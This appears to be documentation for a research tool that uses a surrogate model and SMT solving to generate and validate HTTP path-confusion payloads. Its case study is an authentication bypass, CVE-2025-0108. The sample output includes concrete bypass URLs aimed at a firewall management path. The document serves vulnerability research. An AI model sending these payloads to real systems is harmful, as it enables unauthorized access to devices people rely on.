## Exploit Payload Generator

The **Exploit Payload Generator** takes the HTTP path discrepancy model you created earlier (the ‚Äúsurrogate model‚Äù) and uses an SMT-backed search to discover URL encodings or transformations that succeed under one parser but fail under another. You can easily reuse the same workflow across different case studies.

### Example Invocation

```bash
python manage.py core exploit-generator services generate-exploit-payloads \
  --target-path '/php/ztp_gate.php/PAN_Help/x.css.gz' \
  --surrogate-model ./case_study/authentication_bypass_cve-2025-0108/presets/surrogate_model/surrogate_model_nginx_apachehttpserver_apachehttpserverinternal.py \
  --max-workers 6 \
  --smt-timeout 10
```

- `--target-path`  
  The URL path you want to probe (the ‚Äúvictim‚Äù resource).  
- `--surrogate-model`  
  The Python module defining your surrogate model (in our case, the file under `case_study/.../surrogate_model_*.py`).  
- `--max-workers`  
  Degree of parallelism for SMT solver calls.  
- `--smt-timeout`  
  Per-call timeout (in seconds) for each solver query.

When you run this, the tool will:

1. **Load** your surrogate model and seed the SMT search.  
2. **Generate** candidate payloads in parallel, each combining different percent-encodings and path transformations.  
3. **Record** successes (payloads that confuse one parser but not another) and failures, along with timing and solver logs.  
4. **Emit** a JSON log (`exploit_generation_output.json` by default) summarizing all attempts.

## Exploit Payload Generator Output

After running:

```bash
python manage.py core exploit-generator services generate-exploit-payloads \
  --target-path '/php/ztp_gate.php/PAN_Help/x.css.gz' \
  --surrogate-model ./case_study/authentication_bypass_cve-2025-0108/presets/surrogate_model/surrogate_model_nginx_apachehttpserver_apachehttpserverinternal.py \
  --max-workers 6 \
  --smt-timeout 10
```

you‚Äôll get a JSON log (by default `exploit_generation_output.json`) with the following structure:

```json
{
  "options": { ‚Ä¶ },
  "steps": { ‚Ä¶ },
  "smt_solving_info": [ ‚Ä¶ ],
  "filtered_candidates": [ ‚Ä¶ ],
  "final_transformed_urls": [ ‚Ä¶ ]
}
```

### 1. `options`

Echoes back the CLI parameters:

- `output_url`‚ÄÉ‚Äì the target path you provided  
- `surrogate_model`‚ÄÉ‚Äì path to your Python surrogate model module  
- `smt_timeout`‚ÄÉ‚Äì per‚Äêcall timeout in seconds  
- `max_transformation_num`‚ÄÉ‚Äì max transformations per server  
- `max_workers`‚ÄÉ‚Äì degree of parallel SMT calls  
- `random_seed`‚ÄÉ‚Äì RNG seed for reproducibility

<details>
<summary>Example</summary>

```json
"options": {
  "output_url": "/php/ztp_gate.php/PAN_Help/x.css.gz",
  "surrogate_model": "./case_study/.../surrogate_model_nginx_...internal.py",
  "smt_timeout": 10,
  "max_transformation_num": 1,
  "max_workers": 6,
  "random_seed": 715706
}
```
</details>

---

### 2. `steps`

Timestamps and durations for each phase:

- **step1**: SMT‚Äêbased candidate search  
  - `start` / `end`‚ÄÉ‚Äì ISO timestamps  
  - `duration`‚ÄÉ‚Äì total seconds  
  - `smt_solving_count`‚ÄÉ‚Äì how many solver queries were processed  
- **step2**: Normalization expansion  
- **step3**: Transformation expansion

<details>
<summary>Example</summary>

```json
"steps": {
  "step1": {
    "start": "2025-05-03T19:20:13.291340",
    "end":   "2025-05-03T19:21:40.321552",
    "duration":          87.03,
    "smt_solving_count": 60
  },
  "step2": { "start": "...", "end": "...", "duration": 0.0023 },
  "step3": { "start": "...", "end": "...", "duration": 0.00031 }
}
```
</details>

---

### 3. `smt_solving_info`

An array of one entry per SMT task, in chronological order:

- `summary_info`‚ÄÉ‚Äì description of the server‚Äêtransformation combination  
- `elapsed`‚ÄÉ‚Äì solver run time in seconds (or `null` on timeout/error)  
- `timestamp`‚ÄÉ‚Äì ISO time when that task finished  
- `status`‚ÄÉ‚Äì one of `"success"`, `"failed"`, `"timeout"`, `"error"`  
- `found_url`‚ÄÉ‚Äì only for successful entries, the URL payload that passed the attack criteria

<details>
<summary>Sample entries</summary>

```json
"smt_solving_info": [
  {
    "summary_info": "nginx(N:N, T:None) | apachehttpserver(N:N, T:None) | apachehttpserverinternal(N:N, T:Inconsistency_transformation_composite_middle(/./ -> /))",
    "elapsed":    0.1596,
    "timestamp": "2025-05-03T19:20:14.049560",
    "status":    "failed"
  },
  {
    "summary_info": "...",
    "elapsed":    4.5504,
    "timestamp": "...",
    "status":    "success",
    "found_url": "/unauth/../php/ztp_gate.php/PAN_Help/x.css.gz"
  },
  ‚Ä¶
]
```
</details>

---

### 4. `filtered_candidates`

After step 1, some ‚Äúsuccessful‚Äù payloads may not satisfy each server‚Äôs *essential* transformation requirements. This list records:

- `summary`‚ÄÉ‚Äì same combination string as above  
- `satisfied`‚ÄÉ‚Äì `true` only if **all** essential transformations were applied  
- `input_url`‚ÄÉ‚Äì the payload URL found in step 1

<details>
<summary>Example</summary>

```json
"filtered_candidates": [
  {
    "summary":    "nginx(normalize=N, transformations=None) | apachehttpserver(normalize=N, transformations=None) | apachehttpserverinternal(normalize=Y, transformations=None)",
    "satisfied":  false,
    "input_url":  "/unauth/../php/ztp_gate.php/PAN_Help/x.css.gz"
  },
  {
    "summary":    "‚Ä¶",
    "satisfied":  true,
    "input_url":  "/unauth/../php/ztp_gate.php/PAN_Help/x.css"
  }
]
```
</details>

---

### 5. `final_transformed_urls`

All distinct URLs produced after full normalization + transformation expansion (steps 2 & 3). You can feed these into your validation workflow to confirm real‚Äêworld exploitation.

<details>
<summary>Example</summary>

```json
"final_transformed_urls": [
  "/unauth/./..%2F./php/ztp_gate.php/PAN_Help/x.css",
  "/unauth%252F%252F..%252F/php/ztp_gate.php/PAN_Help/x.css",
  "‚Ä¶",
  "/unauth/../php/ztp_gate.php/PAN_Help/x.css"
]
```
</details>

---

With this schema in hand, you can parse the JSON to:

1. **Audit** which combinations were tried and which succeeded.  
2. **Filter** out incomplete or invalid payloads.  
3. **Export** the final set of candidate URLs for automated validation or manual review.  

This makes it easy to integrate the generator into larger experiment pipelines or continuous‚Äêintegration checks for new case studies.

### Validating Generated Exploits

You can validate the generated payloads against your surrogate model using:

```bash
python manage.py core exploit-generator services validate-exploit-payloads \
  --target-path '/php/ztp_gate.php/PAN_Help/x.css.gz' \
  --surrogate-model ./case_study/authentication_bypass_cve-2025-0108/presets/surrogate_model/surrogate_model_nginx_apachehttpserver_apachehttpserverinternal.py \
  --smt-timeout 10 \
  --validation-json ./pathfault/results/exploit_payload_generator/exploit_generation_output.json
```

- `--target-path`  
  Same victim path used during generation  
- `--surrogate-model`  
  The same surrogate model file  
- `--smt-timeout`  
  SMT timeout for each validation query  
- `--validation-json`  
  Path to the JSON output file from the exploit generation phase (typically `exploit_generation_output.json`)

The validator will:

1. Load all transformed payloads from the generation log  
2. For each candidate, check whether the SMT model can derive the original `target-path`  
3. Log successful/failed validations and record timings  
4. Save results in a validation summary JSON (`output_validation.json` by default)

You can use this to confirm which payloads are **truly exploitable** and which ones fail under symbolic validation.

## Combined Workflow: Generate and Validate Exploit Payloads

This command allows you to **generate exploit payloads** using SMT-based search and **immediately validate** them in a single CLI invocation. It is especially useful for streamlining experiments and automating end-to-end path confusion exploit discovery.

---

### ‚úÖ Example Usage

```bash
python manage.py core exploit-generator workflows generate-validated-exploit-payloads \
  --gen-target-path '/php/ztp_gate.php/PAN_Help/x.css.gz' \
  --gen-surrogate-model ./case_study/authentication_bypass_cve-2025-0108/presets/surrogate_model/surrogate_model_nginx_apachehttpserver_apachehttpserverinternal.py \
  --gen-smt-timeout 10 \
  --gen-max-workers 6 \
  --gen-max-transformation-num 1
```

This runs **both** generation and validation, saving the results in structured JSON logs.

---

### üîß Arguments

#### ‚ñ∂ Generation Phase (`--gen-*`)

- `--gen-target-path`  
  Path to the victim resource (the URL you want to exploit).

- `--gen-surrogate-model`  
  Python file defining the surrogate model.

- `--gen-smt-timeout`  
  SMT timeout per query (in seconds).

- `--gen-max-transformation-num`  
  Maximum number of transformations to apply per server.

- `--gen-max-workers`  
  Number of parallel solver processes to run.

- `--gen-random-seed` *(optional)*  
  Seed for deterministic SMT exploration.

- `--gen-output` *(optional)*  
  Output file path for the generation result (default: `./pathfault/results/exploit_payload_generator/exploit_generation_output.json`).

#### ‚ñ∂ Validation Phase (`--val-*`)

- `--val-smt-timeout` *(optional)*  
  SMT timeout for validation (defaults to generation timeout).

- `--val-random-seed` *(optional)*  
  Random seed for validation (defaults to generation seed).

- `--val-output` *(optional)*  
  Output file path for validation log (default: `./pathfault/results/exploit_payload_generator/exploit_validation_output.json`).

---

### üß≠ Workflow Steps

1. **Step 1 ‚Äì Generate Exploit Payloads**  
   Invokes the same logic as `generate-exploit-payloads`, discovering path confusion candidates through symbolic reasoning.

2. **Step 2 ‚Äì Validate Generated Payloads**  
   Automatically feeds generated payloads into the validator, verifying whether the payloads actually reconstruct the expected output path.

---

### üìù Output Files

| File Path | Description |
|-----------|-------------|
| `exploit_generation_output.json` | Contains all SMT-generated payloads with status and metadata |
| `exploit_validation_output.json` | Shows whether each payload is truly exploitable |

---

### üß™ Use Cases

- Run this command to **automatically validate** SMT-generated exploit payloads in one step.
- Useful for benchmarking surrogate models across various server combinations.
- Can be integrated into CI/CD pipelines or academic experiments.

---

Let us know if you‚Äôd like a report summarizer, auto-evaluator, or visualization toolchain built on top of these logs.